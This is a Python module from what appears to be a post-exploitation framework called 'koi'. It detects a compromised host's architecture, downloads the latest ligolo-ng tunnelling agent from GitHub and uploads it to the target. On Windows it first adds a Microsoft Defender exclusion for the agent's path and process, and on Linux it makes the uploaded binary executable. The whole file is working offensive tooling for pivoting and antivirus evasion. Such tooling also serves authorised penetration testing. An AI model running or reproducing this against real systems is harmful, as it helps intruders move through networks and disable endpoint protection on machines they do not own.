from __future__ import annotations

import io
import json
import re
import tarfile
import time
import zipfile

from koi.modules.blueprint import KoiModule
from koi.utils.cache import cache_path, fetch_or_cache

_GITHUB_API = "https://api.github.com/repos/nicocha30/ligolo-ng/releases/latest"
_RELEASE_CACHE_NAME = "ligolo_latest_release.json"

_ARCH_MAP = {
    "x86_64":  "amd64",
    "aarch64": "arm64",
    "armv7l":  "arm",
    "armv6l":  "arm",
    "i686":    "386",
    "i386":    "386",
    "amd64":   "amd64",
    "arm64":   "arm64",
    "x86":     "386",
}


class LigoloModule(KoiModule):
    name = "ligolo"
    description = "Fetch the latest ligolo-ng agent and upload it to the target."
    usage = "ligolo <id> [-o <remote_path>]"
    category = "Pivoting"
    platform = ["linux", "windows_ps"]
    arguments = [
        {
            "flags": ["-o", "--output"],
            "default": None,
            "help": "Remote destination path for the agent binary",
        },
    ]

    def _detect_arch(self) -> str:
        if self.session.os_type == "linux":
            raw = self._exec_clean("uname -m")
        else:
            raw = self._win_query("$env:PROCESSOR_ARCHITECTURE")

        raw = raw.strip().lower()
        arch = _ARCH_MAP.get(raw)
        if arch is None:
            raise RuntimeError(f"Unrecognised architecture: {raw!r}")
        return arch

    @classmethod
    def _latest_release(cls) -> tuple[str, list[dict], str]:
        raw, source = fetch_or_cache(
            _GITHUB_API, _RELEASE_CACHE_NAME,
            headers={"User-Agent": "koi/ligolo-module", "Accept": "application/json"},
        )
        data = json.loads(raw)
        return data["tag_name"], data["assets"], source

    @classmethod
    def resolve_external_resources(cls) -> list[dict]:
        """List every agent asset of the latest release for ``--local-prepare``.

        'Always latest' cannot be pre-listed statically, so prep resolves the
        release now (caching the JSON under the key run time reads back) and
        keys each asset exactly like :meth:`_fetch_agent` looks it up.
        """
        _tag, assets, _source = cls._latest_release()
        resources: list[dict] = []
        for asset in assets:
            name = asset.get("name", "")
            low = name.lower()
            if "agent" in low and (low.endswith(".tar.gz") or low.endswith(".zip")):
                resources.append({
                    "name": name,
                    "url": asset["browser_download_url"],
                    "cache_key": f"ligolo_agent_{name}",
                })
        return resources

    def _pick_asset(self, assets: list[dict], os_name: str, arch: str) -> dict:
        for asset in assets:
            n = asset["name"].lower()
            if "agent" in n and os_name in n and arch in n:
                return asset
        raise RuntimeError(
            f"No ligolo-ng agent asset found for os={os_name!r} arch={arch!r}.\n"
            f"Available: {[a['name'] for a in assets]}"
        )

    def _extract_agent(self, archive_data: bytes, name: str) -> bytes:
        name = name.lower()

        if name.endswith(".zip"):
            with zipfile.ZipFile(io.BytesIO(archive_data)) as zf:
                candidates = [
                    n for n in zf.namelist()
                    if re.search(r'agent(\.exe)?$', n, re.IGNORECASE)
                    and "__MACOSX" not in n
                ]
                if not candidates:
                    raise RuntimeError(f"agent binary not found in zip: {zf.namelist()}")
                return zf.read(candidates[0])

        with tarfile.open(fileobj=io.BytesIO(archive_data), mode="r:gz") as tf:
            candidates = [
                m for m in tf.getmembers()
                if re.search(r'agent$', m.name, re.IGNORECASE)
            ]
            if not candidates:
                raise RuntimeError(f"agent binary not found in tar: {[m.name for m in tf.getmembers()]}")
            f = tf.extractfile(candidates[0])
            if f is None:
                raise RuntimeError("Could not read agent from archive")
            return f.read()

    def _fetch_agent(self, asset: dict) -> tuple[bytes, str]:
        url = asset["browser_download_url"]
        name = asset["name"]
        cache_name = f"ligolo_agent_{name}"
        archive_data, source = fetch_or_cache(
            url, cache_name, headers={"User-Agent": "koi/ligolo-module"}
        )
        return self._extract_agent(archive_data, name), source

    def run(self) -> None:
        os_type = self.session.os_type

        with self.spinner("Detecting target architecture..."):
            try:
                arch = self._detect_arch()
            except Exception as exc:
                self.err(f"Architecture detection failed: {exc}")
                return

        os_name = "windows" if "windows" in os_type else "linux"
        self.status(f"Target: {os_name}/{arch}")

        with self.spinner("Fetching latest ligolo-ng release info..."):
            try:
                tag, assets, release_source = self._latest_release()
            except Exception as exc:
                self.err(f"Could not reach GitHub API: {exc}")
                return

        if release_source == "cache":
            self.ok(f"Using cached ligolo-ng release info ({cache_path(_RELEASE_CACHE_NAME)})")

        self.status(f"Latest release: {tag}")

        try:
            asset = self._pick_asset(assets, os_name, arch)
        except RuntimeError as exc:
            self.err(str(exc))
            return

        self.status(f"Asset: {asset['name']}  ({asset['size'] // 1024} KB)")
        cache_name = f"ligolo_agent_{asset['name']}"

        with self.spinner("Downloading and extracting agent binary..."):
            try:
                agent_bytes, agent_source = self._fetch_agent(asset)
            except Exception as exc:
                self.err(f"Download/extraction failed: {exc}")
                return

        if agent_source == "cache":
            self.ok(f"Using cached ligolo agent archive ({cache_path(cache_name)})")

        self.status(f"Agent extracted ({len(agent_bytes)} bytes)")

        if self.args.output:
            dest = self.args.output
        elif os_name == "windows":
            dest = ".\\agent.exe"
        else:
            dest = "./agent"

        if os_name == "windows":
            import ntpath

            dest_dir = ntpath.dirname(dest)
            with self.spinner("Adding Defender exclusion..."):
                self._win_query(
                    f"Add-MpPreference"
                    f" -ExclusionPath '{self._ps_quote(dest_dir)}'"
                    f" -ExclusionProcess '{self._ps_quote(dest)}'"
                )
            self.status(f"Defender exclusion added for {dest_dir}")

        self.status(f"Uploading to {dest}...")
        transfer_timeout = max(60, len(agent_bytes) // 50_000 + 30)
        bar = self.ui.ProgressBar(total=len(agent_bytes))
        ok = self._upload_bytes(agent_bytes, dest, timeout=transfer_timeout, on_progress=bar.update)
        bar.done()
        print()

        if not ok:
            self.err("Upload failed or file not present on target after transfer.")
            return

        time.sleep(1.5)

        if os_name == "linux":
            quoted = self._shell_quote(dest)
            result = self.exec(f"test -s {quoted} && echo OK || echo MISS")
            if "OK" not in result.stdout:
                self.err("Upload failed or file not present on target after transfer.")
                return
            self.exec(f"chmod +x {quoted}")
        else:
            check = self._win_query(f"(Test-Path '{self._ps_quote(dest)}').ToString()")
            if check.strip().lower() != "true":
                self.err("Upload failed or file not present on target after transfer.")
                return

        print()
        self.box("ligolo-ng agent deployed", {
            "version": tag,
            "asset": asset["name"],
            "arch": arch,
            "remote": dest,
            "size": f"{len(agent_bytes)} bytes  ({len(agent_bytes)/1024:.1f} KB)",
        })
